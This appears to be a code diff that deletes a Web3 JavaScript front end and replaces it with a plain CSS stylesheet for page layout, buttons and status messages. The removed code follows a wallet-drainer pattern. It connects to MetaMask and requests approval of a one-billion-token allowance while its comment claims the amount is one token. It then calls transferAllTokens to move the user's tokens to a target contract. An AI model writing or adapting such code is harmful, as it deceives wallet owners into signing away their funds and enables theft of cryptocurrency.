@@ -1,45 +1,56 @@
-const Web3 = require('web3');
-
-// 请替换为你的合约地址和 ABI
-const contractAddress = '你的合约地址';
-const contractABI = [
-    // 将你的合约 ABI 粘贴在这里
-];
-
-let web3;
-let contract;
-let accounts;
-
-async function initWeb3() {
-    // 检查是否存在 Ethereum 钱包
-    if (typeof window.ethereum !== 'undefined') {
-        web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        accounts = await web3.eth.getAccounts();
-        document.getElementById('walletAddress').textContent = `钱包地址: ${accounts[0]}`;
-        document.getElementById('walletAddress').classList.remove('hidden');
-        document.getElementById('authorizeButton').classList.remove('hidden');
-    } else {
-        alert('请安装 MetaMask 钱包!');
-    }
+/* 设置页面背景色和基本字体 */
+body {
+    background-color: #f8f9fa;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 0;
 }
 
-async function authorizeTransfer() {
-    // 批准合约转移代币
-    const amount = web3.utils.toWei('1000000000', 'ether'); // 设置要授权的数量（例如 1 个代币）
-    const tokenAddress = '代币合约地址'; // 替换为相应的代币合约地址
-    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-    await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
-    document.getElementById('transferButton').classList.remove('hidden');
+/* 容器的样式 */
+.container {
+    margin-top: 50px;
+    max-width: 600px;
+    background-color: #ffffff;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
 }
 
-async function transferTokens() {
-    const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
-    await autoTransferContract.methods.transferAllTokens(accounts[0]).send({ from: accounts[0] });
-    alert('代币已成功转移到目标地址！');
+/* 页面标题样式 */
+h1 {
+    font-size: 28px;
+    font-weight: 600;
+    color: #333;
 }
 
-// 事件监听
-document.getElementById('connectButton').addEventListener('click', initWeb3);
-document.getElementById('authorizeButton').addEventListener('click', authorizeTransfer);
-document.getElementById('transferButton').addEventListener('click', transferTokens);
+/* 输入框的样式 */
+.form-control {
+    border-radius: 5px;
+    border: 1px solid #ced4da;
+    padding: 10px;
+    font-size: 16px;
+}
+
+/* 按钮的样式 */
+.btn {
+    border-radius: 5px;
+    padding: 10px 20px;
+    font-size: 16px;
+}
+
+/* 按钮的悬停效果 */
+.btn-primary:hover, .btn-success:hover {
+    opacity: 0.85;
+}
+
+/* 成功信息或错误信息的样式 */
+#message {
+    font-size: 16px;
+    font-weight: 500;
+    color: #28a745;
+}
+
+/* 对于失败时的消息颜色 */
+#error {
+    color: #dc3545;
+}
